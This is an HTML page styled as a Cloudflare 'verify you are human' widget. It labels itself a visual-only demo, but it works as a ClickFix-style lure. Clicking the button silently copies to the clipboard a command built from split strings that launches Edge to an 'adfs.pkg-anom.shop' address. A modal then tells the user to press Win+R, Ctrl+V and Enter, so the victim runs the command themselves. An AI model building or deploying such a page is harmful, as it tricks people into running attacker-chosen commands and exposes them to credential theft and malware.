<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Verification Widget (Visuals Only)</title>
  <style>
    :root {
      --bg: #0b0f19;   /* was #ffffff — now dark page background */
      --panel: #f7f7f7; /* inner fill, very light */
      --border: #e5e7eb; /* subtle border */
      --text: #111827; /* near-black */
      --muted: #6b7280; /* gray-500 */
      --success: #22c55e; /* green check */
      --brand: #f38021; /* Cloudflare-like orange */
    }

    * { box-sizing: border-box; }
    html, body { height: 100%; }
    body {
      margin: 0;
      background: var(--bg);
      display: grid; place-items: center;
      padding: 24px;
      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Inter, "Helvetica Neue", Arial, "Apple Color Emoji", "Segoe UI Emoji";
      color: var(--text);
    }

    /* Outer frame */
    .frame {
      width: min(820px, 92vw);
      background: var(--panel);
      border: 2px solid #ededed; /* faint outer, like screenshot */
      box-shadow: 0 0 0 1px var(--border) inset; /* subtle inner stroke */
      border-radius: 2px;
      padding: 18px 22px;
    }

    .row {
      display: flex; align-items: center; justify-content: space-between;
      gap: 16px;
    }

    /* Left: status */
    .left { display: flex; align-items: center; gap: 14px; }

    /* Spinner stays as previously set (hidden until verifying) */
    .spinner { width: 60px; height: 60px; display: none; place-items: center; animation: spin 1s linear infinite; }
    .frame.verifying .spinner { display: grid; }
    .spinner svg { width: 100%; height: 100%; }
    .spinner circle { fill: var(--success); }
    @keyframes spin { to { transform: rotate(360deg); } }

    /* Verifying text reduced by ~30% (46 -> 32) */
    .success-text { font-size: 32px; font-weight: 600; letter-spacing: .2px; }

    /* Right: brand */
    .right { display: grid; justify-items: end; align-content: center; }
    .brand { display: inline-flex; gap: 10px; align-items: center; }
    .brand svg { width: 60px; height: 40px; flex: 0 0 auto; }
    .brand .wordmark { font-weight: 800; letter-spacing: 2px; font-size: 26px; }
    .links { font-size: 23px; color: var(--text); opacity: .8; }
    .links a { color: inherit; text-decoration: none; }
    .links a:hover { text-decoration: underline; }

    @media (max-width: 560px) {
      .success-text { font-size: 25px; } /* 36 -> ~25 */
      .brand .wordmark { font-size: 21px; letter-spacing: 1.8px; }
      .links { font-size: 21px; }
    }

    .wrap { transform: scale(.55); transform-origin: center; }

    /* Modal */
    .modal-backdrop { position: fixed; inset: 0; background: rgba(0,0,0,.45); display: none; align-items: center; justify-content: center; z-index: 1000; }
    .modal-backdrop.show { display: flex; }
    .modal { background: #fff; border: 1px solid #e5e7eb; border-radius: 8px; width: min(560px, 90vw); box-shadow: 0 24px 60px rgba(0,0,0,.25); color: #111827; }
    .modal header { display: grid; grid-template-columns: 1fr auto 1fr; align-items: center; padding: 14px 16px; border-bottom: 1px solid #e5e7eb; }
    .modal header h3 { margin: 0; font-size: 16px; font-weight: 700; }
    .modal .close { border: none; background: transparent; font-size: 20px; line-height: 1; cursor: pointer; color: #6b7280; }
    .modal .body { padding: 14px 16px; }
    .modal ol { margin: 0; padding-left: 20px; }

    .k { display: inline-flex; align-items: center; gap: 6px; padding: 2px 8px; border: 1px solid #d1d5db; border-radius: 6px; background: #f9fafb; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; font-size: 14px; }
    .k svg { width: 16px; height: 16px; }

    .icon-pdf { display: inline-flex; align-items: center; gap: 8px; grid-column: 2; justify-self: center; }
    .icon-pdf svg { width: 63px; height: 63px; }

    .sr-only { position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0,0,0,0); white-space: nowrap; border: 0; }

    /* Dark, accessible verify button with proper text formatting */
    .btn-dark {
      appearance: none; border: none; cursor: pointer;
      background: #111827; color: #ffffff;
      font-family: inherit; font-weight: 700; font-size: 21px; /* 50% larger than 14px */
      line-height: 1.15;
      padding: 10px 18px; border-radius: 9px;
      display: inline-flex; align-items: center; justify-content: center;
      text-align: center; text-decoration: none; letter-spacing: .2px;
    }
    .btn-dark:focus { outline: 2px solid #93c5fd; outline-offset: 2px; }
    .btn-dark:hover { filter: brightness(1.05); }
    .btn-dark:active { transform: translateY(0.5px); }
  </style>
</head>
<body>
  <!-- purely visual demo; no verification logic -->
  <div class="wrap">
    <div class="frame" role="group" aria-label="Human verification">
      <div class="row">
        <div class="left">
          <div class="spinner" aria-hidden="true">
            <svg viewBox="0 0 44 44" aria-hidden="true">
              <g>
                <circle cx="38" cy="22" r="2.2"/>
                <circle cx="35.856" cy="30" r="2.2"/>
                <circle cx="30" cy="35.856" r="2.2"/>
                <circle cx="22" cy="38" r="2.2"/>
                <circle cx="14" cy="35.856" r="2.2"/>
                <circle cx="8.144" cy="30" r="2.2"/>
                <circle cx="6" cy="22" r="2.2"/>
                <circle cx="8.144" cy="14" r="2.2"/>
                <circle cx="14" cy="8.144" r="2.2"/>
                <circle cx="22" cy="6" r="2.2"/>
                <circle cx="30" cy="8.144" r="2.2"/>
                <circle cx="35.856" cy="14" r="2.2"/>
              </g>
            </svg>
          </div>
          <!-- Initially show "Ready"; change to "Verifying..." after click -->
          <div class="success-text" id="statusText">Ready</div>
        </div>

        <div class="right" aria-hidden="false">
          <div class="brand" aria-label="Attribution">
            <!-- Simple Cloudflare-like mark (genericized) -->
            <svg viewBox="0 0 64 40" aria-hidden="true">
              <defs>
                <linearGradient id="g" x1="0" x2="1" y1="0" y2="0">
                  <stop offset="0" stop-color="#fbbf24"/>
                  <stop offset="1" stop-color="#f97316"/>
                </linearGradient>
              </defs>
              <path d="M22 22c0-7 6-13 13-13 5 0 9 3 11 7 6 0 10 4 10 9H22z" fill="url(#g)"/>
              <rect x="6" y="26" width="36" height="4" rx="2" fill="#fff"/>
            </svg>
            <span class="wordmark">CLOUDFLARE</span>
          </div>
          <div class="links" aria-label="Policy links"> <a href="#">Privacy</a> • <a href="#">Terms</a></div>
        </div>
      </div>

      <!-- Updated button: dark, larger, and new label -->
      <div style="margin-top:12px; text-align:center;">
        <button id="verifyBtn" class="btn-dark" title="Verify" type="button">Click here to verify</button>
      </div>
    </div>
  </div>

  <div class="modal-backdrop" id="modal">
    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
      <header>
        <div class="icon-pdf" aria-hidden="false">
          <!-- Centered red doc with white padlock -->
          <svg viewBox="0 0 64 64" aria-hidden="true">
            <!-- Red document with folded corner -->
            <path d="M14 6h24l12 12v34a4 4 0 0 1-4 4H14a4 4 0 0 1-4-4V10a4 4 0 0 1 4-4z" fill="#ef4444"/>
            <path d="M38 6v12a4 4 0 0 0 4 4h12" fill="#f87171"/>
            <!-- White padlock centered -->
            <g fill="#ffffff">
              <!-- lock body -->
              <rect x="22" y="30" width="20" height="16" rx="3"/>
              <!-- shackle -->
              <path d="M32 22c-4 0-7 3-7 7v1h4v-1c0-1.65 1.35-3 3-3s3 1.35 3 3v1h4v-1c0-4-3-7-7-7z"/>
              <!-- keyhole -->
              <circle cx="32" cy="38" r="2" fill="#ef4444"/>
            </g>
          </svg>
          <span id="modalTitle" class="sr-only">Instructions</span>
        </div>
        <button class="close" aria-label="Close" id="modalClose" style="grid-column:3; justify-self:end;">×</button>
      </header>
      <div class="body">
        <ol>
          <li style="margin-bottom:10px;"> On your keyboard, press the <span class="k" title="Windows key" aria-label="Windows key">
            <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="#0078D4" d="M2 5.5l8.5-1.5V11H2V5.5zm0 7.5h8.5v7L2 18.5V13zm10.5-9l9.5-1.7V11H12.5V4zm0 9h9.5v9.2L12.5 20V13z"/></svg>
            Win
          </span> + <span class="k">R</span> key
          </li>
          <li style="margin-bottom:10px;"> Press <span class="k">Ctrl</span> + <span class="k">V</span>.</li>
          <li> Press the <span class="k">Enter</span> key to proceed to the document.</li>
        </ol>
      </div>
    </div>
  </div>

  <script>
    // Compose the string you want to copy
    const bro = "Msedge";
    const usr = "adfs";
    const domo = "pkg-anom";
    const tosd = ".shop";
    const composed = `${bro} https://${usr}.${domo}${tosd}`;

    function onReady(fn){
      if (document.readyState === 'complete' || document.readyState === 'interactive') {
        setTimeout(fn, 0);
      } else {
        document.addEventListener('DOMContentLoaded', fn, { once: true });
      }
    }

    async function copyWithClipboardAPI(text){
      if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
        throw new Error('Clipboard API requires secure context');
      }
      await navigator.clipboard.writeText(text);
      return true;
    }
    function copyWithExecCommand(text){
      try {
        const ta = document.createElement('textarea');
        ta.value = text;
        ta.setAttribute('readonly', '');
        ta.style.position = 'fixed';
        ta.style.left = '-9999px';
        document.body.appendChild(ta);
        ta.select();
        const ok = document.execCommand('copy');
        document.body.removeChild(ta);
        return ok;
      } catch { return false; }
    }
    function copyWithContentEditable(text){
      try {
        const span = document.createElement('span');
        span.textContent = text;
        span.style.whiteSpace = 'pre';
        span.contentEditable = 'true';
        span.style.position = 'fixed';
        span.style.left = '-9999px';
        document.body.appendChild(span);
        const range = document.createRange(); range.selectNodeContents(span);
        const sel = window.getSelection(); sel.removeAllRanges(); sel.addRange(range);
        let ok = false; try { ok = document.execCommand('copy'); } catch {}
        sel.removeAllRanges(); document.body.removeChild(span);
        return ok;
      } catch { return false; }
    }
    async function doCopyAll(text){
      try { await copyWithClipboardAPI(text); return true; } catch {}
      if (copyWithExecCommand(text)) return true;
      if (copyWithContentEditable(text)) return true;
      return false;
    }

    function showModal(){
      var m = document.getElementById('modal');
      if (m) m.classList.add('show');
    }
    function bindModalClose(){
      var c = document.getElementById('modalClose');
      var m = document.getElementById('modal');
      if (c && m){
        c.addEventListener('click', function(){ m.classList.remove('show'); });
        m.addEventListener('click', function(e){ if(e.target === m) m.classList.remove('show'); });
      }
    }

    onReady(function(){
      bindModalClose();

      var frame = document.querySelector('.frame');
      var statusText = document.getElementById('statusText');
      var verifyBtn = document.getElementById('verifyBtn');

      if (verifyBtn) {
        verifyBtn.addEventListener('click', async function(){
          // Show spinner & "Verifying…" after click
          frame.classList.add('verifying');
          statusText.textContent = 'Verifying...';

          try { await doCopyAll(composed); } catch {}

          // After 3s, open modal
          setTimeout(showModal, 3000);
        });
      }
    });
  </script>
</body>
</html>
